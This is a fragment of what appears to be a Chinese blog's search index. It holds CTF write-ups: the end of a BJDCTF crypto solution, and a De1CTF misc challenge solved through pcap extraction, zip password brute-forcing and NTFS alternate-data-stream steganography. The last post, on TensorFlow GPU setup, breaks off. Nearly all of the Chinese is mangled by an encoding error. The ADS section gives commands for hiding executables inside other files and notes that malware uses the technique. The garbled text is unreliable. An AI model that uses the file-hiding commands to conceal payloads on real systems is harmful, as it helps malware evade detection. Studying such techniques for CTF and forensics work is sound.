c+=hex(((ord(m[i])) * a + ord(next(si))) % 128)[2:].zfill(2) return c if __name__ == \"__main__\": m = 'flag{********************************}' a = A salt = SALT assert(len(salt)==3) assert(salt.isalpha()) si = cycle(salt.lower()) print(\"æ˜æ–‡å†…å®¹ä¸ºï¼š\") print(m) print(\"åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š\") c=encrypt(m, a, si) print(c) #åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š #177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d é€šè¿‡assertå¯ä»¥çŸ¥é“saltæ˜¯ä¸‰ä¸ªå­—æ¯ç»„æˆçš„ã€‚ cycleè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ iteratorï¼Œæ¯ä¸€æ¬¡è°ƒç”¨ next è¿”å›ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚ éœ€è¦æ ¹æ® flag{å’Œ } è§£å‡ºAå’ŒSALTï¼Œç„¶åå†ä»£å›å»åè§£ flag ä¸­çš„å­—ç¬¦ã€‚å–æ¨¡çš„è¯æƒ³ä¸åˆ°åˆ«çš„æ–¹æ³•åº”è¯¥ä¹Ÿæ˜¯çˆ†ç ´è§£ã€‚ è€ƒè™‘æ˜¯çˆ†ç ´æ¥è§£A&amp; SALTï¼Œç„¶è€Œæˆ‘açš„çˆ†ç ´èŒƒå›´å¤ªå¤§äº†è®¾åˆ°äº† 1000 ç„¶åå°±æ²¡æ•´å‡ºæ¥â€¦â€¦ï¼ˆï¼ˆ èµ›åçœ‹äººå®¶å¤§ä½¬è§£å‡ºæ¥Aæ˜¯57ï¼Œsaltæ˜¯ahhã€‚ ï¼ˆä¹‹åå†å¤ç°8 å°ç»“æœ€ç»ˆçš„è§£é¢˜æƒ…å†µå¦‚ä¸‹ã€‚ Web çš„å°çº¢èŠ±è¿™ä¹ˆå¤šäººè§£å‡ºæ¥ï¼Œå•Šæ˜¯æˆ‘å¤ªèœäº†ã€‚é¢˜ç›®æŠŠå‡ºç½‘æµé‡å°äº†ï¼Œå¼¹ä¸äº†shellï¼Œèµ›åçœ‹ç¾¤é‡Œå¤§ä½¬ä»¬æ˜¯ç”¨æ—¶é—´ç›²æ³¨æ€¼å‡ºæ¥çš„ã€‚ æ€»ä¹‹ï¼Œè¿™æ¬¡é¢˜ç›®è´¨é‡æ„Ÿè§‰æŒºé«˜çš„ï¼Œéš¾åº¦æ˜¯çœŸçš„å¤§å¾—äºšæ‰¹ï¼Œä¸¤å¤©æ‰“ä¸‹æ¥æ¯å¤©éƒ½åœ¨è‡ªé—­â€¦â€¦ è¿™æ¬¡åšé¢˜æ€è·¯æ¯”è¾ƒä¹±ï¼Œå¯èƒ½ä¹Ÿæ¯”è¾ƒä½›ç³»ï¼Œä¸€ä¸‹çœ‹è¿™é¢˜ä¸€ä¸‹çœ‹é‚£é¢˜ï¼Œå™¢åŸæ¥éƒ½ä¸ä¼šåšã€‚ï¼ˆç¾¤é‡ŒèŒæ–°åˆåšå‡ºæ¥äº†ï¼Ÿï¼Ÿï¼Ÿæ‰“æ‰°äº†ã€‚ ç„¶åè¿˜æœ‰å¤§ä½¬ä¸¤å‘¨å­¦ä¼š pwn ç„¶ååšå‡ºäº†ä¸€å †é¢˜ï¼Œè¿™ä¹ˆå®¹æ˜“å…¥é—¨çš„å˜›ï¼Œå¿ƒåŠ¨äº†ã€‚ï¼ˆç®—äº†8ï¼‰ CyberChefä¸ºäº†ä¾¿äºæ‰“ CTFï¼Œå‰å¤©æ™šä¸Šåšé¢˜é€”ä¸­è‡ªå·±æ­äº†ä¸ª CyberChefï¼Œæˆ‘æ‰ä¸ä¼šè¯´ä¹‹å‰ä¸€ç›´æƒ³æ­ä½†ä¸€ç›´æ²¡æ•´å‘¢ã€‚ ç½‘å€åœ¨è¿™é‡Œï¼šhttps://chef.miaotony.xyz/ ä¸å¸¦å„ç§é¡µé¢ç»Ÿè®¡ï¼Œä¸æ”¶é›†éšç§ä¿¡æ¯ï¼Œæ¬¢è¿æ¥ç©æ¥ BAKE å‘€ï¼ ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå°±æ˜¯å¯ä»¥å¤„ç†åŒ…æ‹¬ä½†ä¸é™äºå„ç§ç¼–ç å„ç§åŠ å¯†å„ç§è½¬æ¢çš„ä¸€ä¸ªåœ¨çº¿å·¥å…·ï¼Œå¯ä»¥æŠŠä¸€ç³»åˆ—å¤„ç†æµç¨‹æ”¾è¿› èœè°± Recipe é‡Œï¼Œç„¶å BAKE å°±å‡ºç»“æœå•¦ï¼ ä¸‹é¢æ˜¯å®˜æ–¹çš„ä»‹ç»ã€‚ The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis The Cyber Swiss Army Knife CyberChef is a simple, intuitive web app for carrying out all manner of â€œcyberâ€ operations within a web browser. These operations include simple encoding like XOR or Base64, more complex encryption like AES, DES and Blowfish, creating binary and hexdumps, compression and decompression of data, calculating hashes and checksums, IPv6 and X.509 parsing, changing character encodings, and much more. The tool is designed to enable both technical and non-technical analysts to manipulate data in complex ways without having to deal with complex tools or algorithms. It was conceived, designed, built and incrementally improved by an analyst in their 10% innovation time over several years. å®˜æ–¹ GitHub ä»“åº“åœ¨è¿™é‡Œã€‚ å¤§æ¦‚å°±è¿™æ ·äº†8 ï¼ˆæºœ","path":"2020/05/24/CTF_BJDCTF3rd/"},{"title":"CTF | 2020 De1CTF Misc Chowder WriteUp","text":"å¼•è¨€å¥”æ¶Œå§ï¼Œåæµªï¼ä»Šå¤©æ˜¯äº”å››é’å¹´èŠ‚ï¼ŒèŠ‚æ—¥å¿«ä¹å‘€ï¼ è¿™å‡ å¤©æœ‰ä¸ª De1CTFï¼Œäº”ä¸€å‰å‡ å¤©å‡ºå»ç©äº†ï¼Œè€ƒè™‘åˆ°ä»Šå¤©æ—©ä¸Šæ¯”èµ›å°±ç»“æŸäº†ï¼Œäºæ˜¯æ˜¨æ™šæ¥çœ‹äº†ä¸€çœ¼é¢˜ç›®ï¼Œåšäº†ä¸ª Misc æ‚çƒ©é¢˜æ¥æ„Ÿå—ä¸€ä¸‹ï¼Œè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚ De1CTF 2020 ç«èµ›æ—¶é—´ï¼š 2020-05-02 09:00:00â€”â€”2020-05-04 09:00:00å‚èµ›æ–¹å¼ï¼šç»„é˜Ÿ æœ¬å±ŠDe1CTFæ˜¯ç”±XCTFè”èµ›çš„åˆä½œå•ä½De1taæˆ˜é˜Ÿç»„ç»‡ï¼Œç”±èµ›å®ç½‘å®‰æä¾›æŠ€æœ¯æ”¯æŒã€‚ä½œä¸ºç¬¬å…­å±ŠXCTFå›½é™…è”èµ›çš„åˆ†ç«™èµ›ï¼Œæœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œé¢å‘å…¨çƒå¼€æ”¾ã€‚ æ­¤æ¬¡æ¯”èµ›å† å†›é˜Ÿä¼å°†ç›´æ¥æ™‹çº§ç¬¬å…­å±ŠXCTFæ€»å†³èµ›ï¼ˆæ€»å†³èµ›å…·ä½“åœ°ç‚¹æ—¶é—´å¾…å®šï¼Œå°†åœ¨ç¡®å®šåé€šçŸ¥è·å¾—èµ„æ ¼çš„å›½é™…å’Œå›½å†…é˜Ÿä¼ï¼‰ã€‚å…¶ä»–å‚èµ›çš„é˜Ÿä¼ä¹Ÿå°†è·å¾—ç§¯åˆ†ï¼Œæ¥ç«äº‰XCTFå†³èµ›çš„å…¶ä»–å¸­ä½ã€‚ å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œflagçš„å½¢å¼ä¸ºDe1CTF{this_is_a_sample_flag}ï¼Œè¯·æäº¤åŒ…å«De1CTF{}çš„å®Œæ•´flagï¼Œæ¥è¿›è¡Œå¾—åˆ†ï¼›å¦‚æœflagæ˜¯å…¶ä»–å½¢å¼ï¼Œé¢˜ç›®ä¸­ä¼šé˜æ˜ã€‚ æ¯”èµ›å¹³å°ï¼š https://adworld.xctf.org.cn é¢å‘å…¨çƒå¼€æ”¾å¯è¿˜è¡Œï¼Œäºæ˜¯ä¹æ¯”èµ›é¢˜ç›®éƒ½åŒè¯­çš„ï¼Œè¿˜ç”¨äº† Google Drive åšé™„ä»¶å­˜å‚¨ã€‚çœ‹äº†ä¸€ä¸‹æ’è¡Œæ¦œï¼Œæ­ªæœå¸ˆå‚…ä»¬è´¼å‰å®³å•Šã€‚ æœ€åé¡ºä¾¿æ€»ç»“äº†ä¸€ä¸‹å…³äº NTFS äº¤æ¢æ•°æ®æµçš„ç›¸å…³åº”ç”¨å§ã€‚ Miscæ‚çƒ©/Misc Chowder https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing Hints: æµé‡åŒ…ä¸­çš„ç½‘ç»œè¿æ¥å¯¹è§£é¢˜æ²¡æœ‰å¸®åŠ© The network connection in pcap is not helping to the challenge ä¸éœ€è¦è®¿é—®æµé‡é‡Œä»»ä½•ä¸€ä¸ªçš„æœåŠ¡å™¨åœ°å€ï¼Œæ‰€æœ‰æ•°æ®éƒ½å¯ä»¥ä»æµé‡åŒ…é‡Œç›´æ¥æå– Do not need to connect the network, every data can be extracted from the pcap In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are â€œDâ€ and â€œEâ€. å‹ç¼©åŒ…å¯†ç æš´ç ´è€ƒç‚¹ä¸­ï¼Œå¯†ç çš„é•¿åº¦ä¸º6ä½ï¼Œå‰ä¸¤ä½ä¸ºDEã€‚ ç½‘ç»œæµé‡æå–é¦–å…ˆ Google Drive ä¸‹è½½ä¸‹æ¥æ˜¯ä¸ªæµé‡æŠ“åŒ…æ–‡ä»¶ Misc_Chowder.pcapã€‚ æ ¹æ®æç¤ºï¼Œç½‘ç»œè¿æ¥å’ŒæœåŠ¡å™¨åœ°å€éƒ½æ²¡ç”¨çš„ï¼Œé‚£ç›´æ¥å¯¼å‡º HTTP å¯¹è±¡å¥½äº†ã€‚ æŒ‰ç…§å¤§å°æ’åºå‘ç°æ˜¯ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ï¼Œè¡¨æ ¼é‡Œæ˜¯ä¸Šä¼ çš„æ–‡ä»¶ã€‚ ä¾æ¬¡æœ‰7å¼ å›¾ç‰‡ï¼Œåˆ†åˆ«å¯¼å‡ºæ¥ã€‚ å‰6å¼ æ˜¯æ­£å¸¸çš„å›¾ç‰‡ï¼Œç¬¬7å¼  7.pngï¼Œæ˜¯ä¸€ä¸ª Google Drive çš„åˆ†äº«åœ°å€ã€‚ ä¹Ÿå°±æ˜¯ https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view ï¼ˆè¿™é‡Œæœ€å¼€å§‹æˆ‘æ•°å­—1å’Œå­—æ¯læ²¡åˆ†æ¸…æ¥šï¼Œäºæ˜¯è®¿é—®äº†æ²¡åˆ†äº«æ–‡ä»¶ï¼Œä»”ç»†çœ‹äº†æ‰å‘ç°â€¦â€¦ Word éšå†™ä¸‹è½½åè§£å‹å¾—åˆ°ä¸€ä¸ª readme.docxï¼Œæ‰“å¼€æŠ¥é”™ï¼Œçœ‹æ¥æ–‡ä»¶é‡Œæ”¹äº†å•¥ä¸œè¥¿ã€‚ é€‰æ‹©æ˜¯åå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼Œçœ‹èµ·æ¥å¥½åƒæ˜¯æ²¡å•¥å…³ç³»ï¼ˆç¡®å®šï¼‰ã€‚ çœ‹äº†ä¸€ä¸‹æ–‡æœ¬ä¹Ÿæ²¡æœ‰éšè—æ–‡å­—ï¼Œçœ‹æ¥æ˜¯ word å†…å®¹ç”¨å¤„ä¸å¤§ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ.docxæ ¼å¼çš„ word å…¶å®å¯¹åº”ç€ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‚£å°±ç”¨å‹ç¼©æ–‡ä»¶æ‰“å¼€çœ‹çœ‹ã€‚ å‘ç°ç›´æ¥å°±åœ¨ç›®å½•ä¸‹ï¼Œç®€å•å¹²è„†çœŸå¥½ã€‚ å‹ç¼©åŒ…å¯†ç æš´ç ´You_found_me_Orz.zip é‡Œæœ‰ä¸€ä¸ª You_found_me_Orz.jpgï¼Œé¢˜ç›®ä¸­æœ‰ hint è¯´ å¯†ç çš„é•¿åº¦ä¸º6ä½ï¼Œå‰ä¸¤ä½ä¸ºDEã€‚äºæ˜¯å°±æ¥çˆ†ç ´å¥½äº†ã€‚ ä½¿ç”¨ DE???? è¿›è¡Œæ©ç çˆ†ç ´ï¼Œæœ€å¼€å§‹å…ˆè¯•äº†ä¸€ä¸‹çº¯å¤§å†™å­—æ¯ã€çº¯å°å†™å­—æ¯ã€çº¯æ•°å­—ã€å¤§å°å†™å­—æ¯ç»„åˆï¼Œå‘ç°éƒ½ä¸å¯¹ï¼Œåæ¥è¯•äº†å¤§å†™å­—æ¯å’Œæ•°å­—ç»„åˆï¼Œè·‘äº†ä¸€é˜µå­å¯†ç å‡ºæ¥äº†ã€‚å°±æ˜¯ DE34Q1. è¯è¯´ä¸ºå•¥è¿™ä¸ªä¸èƒ½è·‘æ»¡ CPUï¼Œæ„Ÿè§‰çˆ†ç ´å¥½æ…¢â€¦â€¦ æ­£å¥½æœ‰å¸¦ä½¬å‘ç°äº†ä¸€ä¸ªç ´è§£ zip æ–‡ä»¶çš„å·¥å…·/åº“ï¼Œå« yazc (Yet Another Zip Cracker). ä»“åº“åœ¨è¿™é‡Œï¼šhttps://github.com/mferland/libzc The libzc library is a simple zip cracking library. It also comes with a command line tool called â€˜yazcâ€™ (Yet Another Zip Cracker). ä¸è¿‡å¯¹äºæ©ç çˆ†ç ´ï¼Œä¼°è®¡è¦å…ˆç”Ÿæˆä¸€ä¸ªå­—å…¸å†æ¥çˆ†ç ´ã€‚ è§£å‹åå¾—åˆ°äº†è¿™å¼ å›¾ç‰‡ã€‚ å›¾åƒéšå†™æ‹–è¿› 010editor é‡Œçœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°æ–‡ä»¶æ‹¼æ¥äº†ä¸€ä¸ªrarå‹ç¼©åŒ…ã€‚ foremost æ²¡æå–å‡ºæ¥ï¼Œäºæ˜¯æ‰‹åŠ¨æå–ä¸€æ³¢å¾—åˆ°äº†è¿™ä¸ªå‹ç¼©åŒ…ã€‚ è§£å‹ä¸Šé¢çš„ rar å‹ç¼©åŒ…ï¼Œå¾—åˆ°çš„flag.txtå†…å®¹å¦‚ä¸‹ï¼š De1CTF{jaivy say that you almost get me!!! } å•¥ï¼Ÿï¼Ÿï¼Ÿåˆæœ‰å‡çš„ flagï¼ä¸è¿‡å¿«äº†å¿«äº†ã€‚ ï¼ˆé¡ºä¾¿æŸ¥äº†ä¸€ä¸‹jaivyæ˜¯ä¸ªå¸ˆå‚…çš„ ID 123.txt this is a 123.txt file from jaivy! 666.jpg å‡çš„ jpgï¼Œå®é™…ä¸Šæ˜¯ png å•¦ã€‚ çœ‹äº†åŠå¤©è¿™ä¸ªå›¾ç‰‡ï¼Œéƒ½æ²¡æ‰¾åˆ°å“ªé‡Œæœ‰éšå†™â€¦â€¦å¸¸è§çš„å›¾åƒéšå†™éƒ½ä¸èµ·ä½œç”¨ã€‚ NTFS äº¤æ¢æ•°æ®æµéšå†™æœ€ååˆå»çœ‹äº†çœ‹å‹ç¼©åŒ…çš„ Hexï¼Œå‘ç°æœ€åè¿™é‡Œæœ‰ä¸ªå¥‡å¦™çš„ä¸œè¥¿çœ‹ç€å°±ä¸å¯¹åŠ²ã€‚ ä½ çœ‹å®ƒå¤šåƒ flag å‘€ï¼ å†çœ‹è¿™ä¸ªå†’å·:ï¼Œçªç„¶æƒ³èµ·æ¥ä¹‹å‰çœ‹å¸ˆå‚…ä»¬å…³äºå†…å­˜å–è¯çš„ WP é‡Œæåˆ°è¿‡ NTFS äº¤æ¢æ•°æ®æµéšå†™ï¼Œè™½ç„¶æ²¡ç»†çœ‹ï¼Œä½†è¯´ä¸å®šè¿™é‡Œå°±æ˜¯å‘¢ï¼ äºæ˜¯æŸ¥äº†ä¸€ä¸‹ç›¸å…³çš„èµ„æ–™ã€‚ åœ¨ NTFS æ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€ NTFS äº¤æ¢æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§° ADSï¼‰ï¼Œè¿™æ˜¯ NTFS ç£ç›˜æ ¼å¼çš„ç‰¹æ€§ä¹‹ä¸€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æœ‰ç€ä¸»æ–‡ä»¶æµå’Œéä¸»æ–‡ä»¶æµï¼Œä¸»æ–‡ä»¶æµèƒ½å¤Ÿç›´æ¥çœ‹åˆ°ï¼›è€Œéä¸»æ–‡ä»¶æµå¯„å®¿äºä¸»æ–‡ä»¶æµä¸­ï¼Œæ— æ³•ç›´æ¥è¯»å–ï¼Œè¿™ä¸ªéä¸»æ–‡ä»¶æµå°±æ˜¯ NTFS äº¤æ¢æ•°æ®æµã€‚ ADS çš„ä½œç”¨åœ¨äºï¼Œå®ƒå…è®¸ä¸€ä¸ªæ–‡ä»¶æºå¸¦ç€é™„åŠ çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼ŒIEæµè§ˆå™¨ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¼šå‘æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæ•°æ®æµï¼Œæ ‡è®°è¯¥æ–‡ä»¶æ¥æºäºå¤–éƒ¨ï¼Œå³å¸¦æœ‰é£é™©ï¼Œé‚£ä¹ˆï¼Œåœ¨ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå¼¹å‡ºæ–‡ä»¶è­¦å‘Šæç¤ºã€‚å†å¦‚ï¼Œåœ¨ç½‘å€æ”¶è—ä¸­ï¼Œä¹Ÿä¼šé™„åŠ ä¸€ä¸ª favicon æ•°æ®æµä»¥å­˜æ”¾ç½‘ç«™å›¾æ ‡ã€‚ ADS ä¹Ÿè¢«ç”¨äºä¸€äº›æ¶æ„æ–‡ä»¶éšè—è‡ªèº«,ä½œä¸ºåé—¨ã€‚ è¦æŸ¥çœ‹ ADS å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ Ntfs Streams Editor è½¯ä»¶ï¼Œæˆ–è€… LADSï¼Œæˆ–è€…ç”¨ dir /rã€‚ è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸ªå‘ï¼Œä½¿ç”¨é™¤ WinRAR ä»¥å¤–çš„è½¯ä»¶è¿›è¡Œæå–ä¼šé€ æˆæ•°æ®æµä¸¢å¤±ã€‚æ‰€ä»¥å¿…é¡»è¦ç”¨ WinRAR æ¥è§£å‹æ‰è¡Œï¼ è¿™é‡Œå‘æ­»æˆ‘äº†ï¼Œæˆ‘ç”¨ Bandizip è§£å‹åæ‰¾äº†åŠå¤©éƒ½æ²¡æ‰¾åˆ°è¿™ä¸ª txt æ–‡ä»¶ï¼Œæœ€åè¿«ä¸å¾—å·²ä¸‹äº†ä¸ª WinRARï¼Œå¹¿å‘Šçƒ¦æ­»äº†ï¼ˆï¼ˆ è§£å‹åé€šè¿‡ dir /r å¯ä»¥çœ‹åˆ°å“ªé‡Œæœ‰ ADSã€‚ è¿™é‡Œå‘ç°å°±è—åœ¨ 666.jpg é‡Œäº†å‘€ï¼ ä½¿ç”¨ notepad å¯ä»¥æŸ¥çœ‹é‡Œé¢çš„å†…å®¹äº†ã€‚ notepad 666.jpg:fffffffflllll.txt äºæ˜¯ flag å°±æ˜¯ De1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb} å…³äº NTFS ADS çš„ä¸€äº›æ€»ç»“è¿™é‡Œé¡ºä¾¿å†æ•´ç†ä¸€ä¸‹å§ï¼Œæ–¹ä¾¿åé¢éœ€è¦çš„æ—¶å€™æ¥æ‰¾ã€‚ æŸ¥çœ‹ ADSLADSé™¤äº†ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•æŸ¥çœ‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ LADS å·¥å…·ã€‚ ä¸‹è½½åœ°å€ï¼š æˆ³è¿™é‡Œ ä½¿ç”¨æ–¹æ³•ï¼š æœç´¢ File æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸‹çš„æ‰€æœ‰æ•°æ®æµï¼šï¼ˆ/Sè¡¨ç¤ºé€’å½’å­ç›®å½•ï¼‰ lads.exe File /S æˆ–è€…æŠŠladså¤åˆ¶åˆ°è¦æœç´¢çš„ç›®å½•ï¼Œå°±ä¸ç”¨æŒ‡å®šfileäº†ã€‚ lads.exe /S è€Œåå†ç”¨ notepad ä¹‹ç±»æ‰“å¼€å°±å®Œäº‹äº†ã€‚ æˆ–è€…ä¹Ÿå¯ä»¥ç”¨ powershell æŸ¥çœ‹å†…å®¹ã€‚ åˆ©ç”¨ -Stream å‚æ•°æ¥æå–ã€‚ cat .\\666.jpg -Stream fffffffflllll.txt # å…¶å®å°±æ˜¯ Get-Content .\\666.jpg -Stream fffffffflllll.txt ä¸è¿‡æ€ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªè½¯ä»¶æŒºè€äº†ï¼Œä½œè€…ç½‘ç«™ä¸Šè¯´Windowsä¸‹ç”¨ dir /r éƒ½æœ‰è¿™ä¸ªåŠŸèƒ½äº†ï¼Œäºæ˜¯ä¸å†éœ€è¦ LADS äº†ï¼Œä¹Ÿå› æ­¤ä¸æä¾›ä¸‹è½½äº†ï¼Œå¦™å•Š 2333. AlternateStreamViewè¿™ä¸ªç½‘ä¸Šä¸€æœå°±æœ‰ä¸‹è½½äº†ã€‚ ä½¿ç”¨èµ·æ¥ä¹Ÿç®€å•æ–¹ä¾¿ã€‚æ”¯æŒæ•°æ®æµçš„æŸ¥çœ‹å’Œæå–ã€‚ Ntfs Streams Editorä¸‹è½½åœ°å€ï¼š https://ntfs-streams-info.en.softonic.com/ æˆ–è€… http://pan.baidu.com/s/1c2zbNaC ä½¿ç”¨èµ·æ¥ä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œæœç´¢æ–‡ä»¶æ‰€åœ¨ç›®å½•å°±å¯ä»¥äº†ï¼Œè€Œä¸”ç›´æ¥å°±æŠŠéšè—åœ¨ ADS ä¸­çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ ï¼ˆå°±æ˜¯è¿™ä¸ªè½¯ä»¶æŠ¥æ¯’è¯´æœ‰å¹¿å‘Šå•¥çš„ï¼Œemmm çœ‹ä¸ªäººå§ï¼Œä¹Ÿæ˜¯ä¸ªè€è½¯ä»¶äº† å½“ç„¶ï¼Œè²Œä¼¼ç”¨ä¸€äº›å†…å­˜å–è¯çš„å·¥å…·ä¹Ÿèƒ½æå–ï¼Œè¿™é‡Œä¸è¯´äº†å•¦ã€‚ å†™å…¥ ADSechoé¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†å†™å…¥éšè—çš„ä¿¡æ¯ã€‚ echo \"hello\" &gt; 1.txt echo \"miaotony\" &gt; 1.txt:2.txt æ³¨æ„ä¸€ä¸‹ï¼Œç”¨diræ˜¯çœ‹ä¸åˆ°è¿™ä¸ªéšè—çš„æ•°æ®æµå“’ã€‚ åŒç†ä½¿ç”¨ binwalk / foremost ä¹Ÿä¸èƒ½çœ‹åˆ°éšå†™çš„æ•°æ®ã€‚ typeè¿˜å¯ä»¥ä½¿ç”¨typeå‘½ä»¤ï¼Œå°†å·²ç»å­˜åœ¨çš„æ–‡ä»¶é™„åŠ ä¸Šå»ã€‚ # type \"è¦éšè—çš„é™„åŠ æ–‡ä»¶\"&gt;\"å®¿ä¸»æ–‡ä»¶\":\"è¦éšè—çš„é™„åŠ æ–‡ä»¶\" type \"2.txt\" &gt; \"1.txt\":\"2.txt\" å¯ä»¥ç”¨å®ƒæ¥å‘ ADS ä¸­å†™å…¥å›¾åƒ/éŸ³é¢‘/å¯æ‰§è¡Œæ–‡ä»¶ã€‚ type \"hidden.jpg\" &gt; \"targe.jpg\":\"hidden.jpg\" type \"hidden.mp4\" &gt; \"targe.jpg\":\"hidden.mp4\" type \"hidden.exe\"&gt;&gt;\"targe.txt\":\"hidden.exe\" type \"hidden.exe\"&gt;&gt;\"targe.exe\":\"hidden.exe\" ä¸è¿‡åœ¨ Windows Vista åŠåç»­ç³»ç»Ÿä¸­å·²ç»æ— æ³•ç›´æ¥è¿è¡Œ ADS ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚ åˆ é™¤ ADSå¯ä»¥ä½¿ç”¨ Ntfs Streams Editorï¼Œæœç´¢åˆ°å‹¾é€‰åˆ é™¤å°±å¥½ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨streams.exeè¿™ä¸ªè½¯ä»¶åˆ é™¤ã€‚ ä¸‹è½½åœ°å€ï¼šæˆ³è¿™é‡Œ streams.exe -d &lt;File&gt; åŠ å…¥-så‚æ•°åˆ™é€’å½’å­ç›®å½•åˆ é™¤ã€‚ å¦‚æœæŠ¥é”™å°±å…ˆæŠŠç›¸å…³çš„è¿›ç¨‹ç»“æŸæ‰å†æ‰§è¡Œã€‚ æ³¨æ„ä¸è¦åœ¨æ ¹ç›®å½•ä¸‹æ‰§è¡Œï¼Œä»¥é˜²åˆ é™¤æœ‰ç”¨çš„æ•°æ®æµå‘€ã€‚ å°ç»“å†è¯´ä¸ªæœ‰æ„æ€çš„äº‹ï¼Œæµè§ˆå™¨ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå‘æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæ•°æ®æµï¼Œæ ‡è®°è¯¥æ–‡ä»¶æ¥æºäºå¤–éƒ¨ï¼Œå³å¯èƒ½å¸¦æœ‰é£é™©ã€‚ ä¼°è®¡ office æç¤ºä¹Ÿæ˜¯æ ¹æ®è¿™ä¸ªæ¥çš„å§ï¼Œå˜»å˜»ã€‚ï¼ˆä¹‹å‰è¿˜æƒ³è¿‡è¿™ä¸ªé—®é¢˜å‘¢ 233 ä¸»è¦è¹­è¿™ä¸ªæœºä¼šç†äº†ä¸€ä¸‹ NTFS äº¤æ¢æ•°æ®æµçš„ç›¸å…³åº”ç”¨ã€‚ è¿™æ¬¡ De1CTF é¢˜ç›®è´¨é‡è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼ŒMisc ç­¾åˆ°é¢˜ Telegram Channel çœ‹ä¸€çœ¼å°±èƒ½æ‹¿åˆ†ï¼Œé—®å·é¢˜è®¿é—®å°±æ‹¿åˆ°æ‰‹äº†ï¼Œè¿˜æ˜¯å¾ˆå‹å¥½çš„å‘¢ã€‚ è‡³äºå‡ºç°ä¸€å † mc_*ä¸ minecraft æœ‰å…³çš„é¢˜ï¼Œå‡ºé¢˜äººæ˜¯å¤šå–œæ¬¢ MC å•Šï¼Œemmm å¤ªéš¾äº†æ²¡ææ‡‚ï¼ˆè™½ç„¶æ²¡ç»†çœ‹ã€‚ ä»€ä¹ˆ easybgm å™¢çœŸæ²¡æ‰¾åˆ°éšå†™åœ¨å“ªé‡Œã€‚ã€‚ å¤§æ¦‚å°±æ˜¯è¿™äº›å†…å®¹äº†å§ã€‚ ï¼ˆæºœäº†æºœäº† ç»“è¯¾è®ºæ–‡è¦å†™ä¸å®Œäº† ReferenceNTFSäº¤æ¢æ•°æ®æµéšå†™çš„åº”ç”¨ NTFSäº¤æ¢æ•°æ®æµéšå†™ï¼ˆä¸Šï¼‰","path":"2020/05/04/CTF_2020De1CTF/"},{"title":"Ubuntu16.04é…ç½®TensorFlow-vGPUç¯å¢ƒ","text":"0x00 å‰è¨€ä¼—æ‰€å‘¨çŸ¥ï¼Œæœºå™¨å­¦ä¹ å¯¹äºè®¡ç®—æœºçš„ç®—åŠ›è¦æ±‚å¾ˆé«˜ï¼Œè€Œ GPU ä¸­çš„å¹¶è¡Œè®¡ç®—èƒ½æœ‰æ•ˆåœ°æé«˜è®¡ç®—æ•ˆç‡ã€‚NVIDIA å®¶çš„ GPU å¤§éƒ½æ”¯æŒ CUDAï¼ˆCompute Unified Device Architectureï¼‰å¹³å°ï¼ŒTensorFlow ç­‰æœºå™¨å­¦ä¹ /æ·±åº¦å­¦ä¹ æ¡†æ¶å¤§éƒ½ä»¥ CUDA ä¸ºåŸºç¡€å®ç°äº† GPU åŠ é€Ÿè®¡ç®—ã€‚ CUDA Â® is a parallel computing platform and programming model developed by NVIDIA for general computing on graphical processing units (GPUs). With CUDA, developers are able to dramatically speed up computing applications by harnessing the power of GPUs. CUDAï¼ˆCompute Unified Device Architectureï¼Œç»Ÿä¸€è®¡ç®—æ¶æ„ï¼‰æ˜¯ç”±NVIDIAæ‰€æ¨å‡ºçš„ä¸€ç§é›†æˆæŠ€æœ¯ï¼Œæ˜¯è¯¥å…¬å¸å¯¹äºGPGPUçš„æ­£å¼åç§°ã€‚é€è¿‡è¿™ä¸ªæŠ€æœ¯ï¼Œç”¨æˆ·å¯åˆ©ç”¨NVIDIAçš„GeForce 8ä»¥åçš„GPUå’Œè¾ƒæ–°çš„Quadro GPUè¿›è¡Œè®¡ç®—ã€‚äº¦æ˜¯é¦–æ¬¡å¯ä»¥åˆ©ç”¨GPUä½œä¸ºC-ç¼–è¯‘å™¨çš„å¼€å‘ç¯å¢ƒã€‚ å¦å¤–æä¸€ä¸‹ 